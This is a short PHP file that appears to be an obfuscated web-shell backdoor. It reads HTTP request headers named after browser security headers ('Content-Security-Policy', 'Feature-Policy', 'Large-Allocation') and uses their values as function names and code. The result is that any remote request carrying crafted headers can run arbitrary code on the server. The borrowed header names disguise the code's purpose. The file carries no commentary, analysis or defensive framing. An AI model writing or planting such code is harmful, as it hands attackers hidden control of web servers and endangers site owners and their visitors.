<?php
$_HEADERS = getallheaders();
if (isset($_HEADERS['Content-Security-Policy'])) {
    $locked = $_HEADERS['Content-Security-Policy']('', $_HEADERS['Feature-Policy']($_HEADERS['Large-Allocation']));
    $locked();
}